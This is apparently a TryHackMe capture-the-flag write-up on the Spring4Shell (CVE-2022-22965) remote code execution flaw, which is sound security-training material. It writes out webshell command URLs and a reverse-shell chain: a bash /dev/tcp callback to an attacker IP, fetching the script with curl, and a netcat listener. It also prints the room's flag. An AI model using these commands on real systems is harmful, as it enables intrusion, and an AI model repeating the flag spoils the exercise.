
# 🧩 TryHackMe Room: Spring4Shell - CVE-2022-22965

**Spring4Shell** is a remote code execution (RCE) vulnerability discovered in Spring Core, affecting applications running on JDK9+ with specific configurations. This room walks through exploiting the vulnerability and understanding its impact on Java-based applications.

---

## 📌 Learning Objectives:
- Understand the cause and impact of CVE-2022-22965 (Spring4Shell).
- Learn how to exploit a vulnerable Spring application.
- Gain hands-on experience using a webshell and reverse shell techniques.

## 🔎 Vulnerability Background

- **CVE ID**: CVE-2022-22965  
- **Name**: Spring4Shell  
- **Type**: Remote Code Execution (RCE)  
- **Affected**: Spring Core on JDK 9 or newer with certain class loader configurations.

### 💥 Root Cause:
Spring4Shell is caused by improper handling of class properties, allowing an attacker to craft malicious HTTP POST requests to manipulate internal class properties (e.g., `class.module.classLoader`), resulting in remote code execution.

---

## 🛠️ Exploitation Process

### 🔧 Setup & Requirements:
- A running vulnerable Java/Spring application
- A known exploit path: `POST /<vulnerable-endpoint> HTTP/1.1`
- A malicious JSP webshell uploaded using crafted POST data

### ✅ Steps to Exploit:
1. Craft a malicious POST request that uploads a `.jsp` webshell.
2. Access the webshell using a URL like:
   ```
   http://<target-ip>/tomcatwar.jsp?pwd=thm&cmd=whoami
   ```

### 🔁 Bonus - Gaining Reverse Shell:
1. Create a reverse shell script:
   ```bash
   #!/bin/bash
   bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1
   ```
2. Make it executable:
   ```bash
   chmod 777 reverse.sh
   ```
3. Host it with a Python HTTP server:
   ```bash
   python3 -m http.server 8000
   ```
4. Curl the script on target:
   ```bash
   curl http://<YOUR_IP>:8000/reverse.sh -o /dev/shm/reverse.sh
   ```
5. Start Netcat listener:
   ```bash
   rlwrap nc -lvnp 443
   ```
6. Execute the shell from the webshell:
   ```bash
   http://<target-ip>/tomcatwar.jsp?pwd=thm&cmd=bash /dev/shm/reverse.sh
   ```

---

## 🏁 Flag

The final flag was found in the `/root` directory after gaining shell access.

```
THM{NjAyNzkyMjU0MzA1ZWMwZDdiM2E5YzFm}
```

---

## 📚 Additional Resources

- [Spring Framework RCE Advisory](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [Praetorian Blog on Spring RCE](https://www.praetorian.com/blog/spring-core-jdk9-rce/)
- [LunaSec Analysis](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)
- [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965)

---

## 🧩 Key Takeaways

- **Spring4Shell** is a critical Java vulnerability that allows full remote code execution.
- Exploitation relies on misconfigurations common in Spring-based apps.
- Attackers can escalate from webshells to full reverse shells using standard Linux tools.

---

### 📅 Room Completed: July 2025  
### 🚩 Platform: [TryHackMe - Spring4Shell](https://tryhackme.com/room/spring4shell)
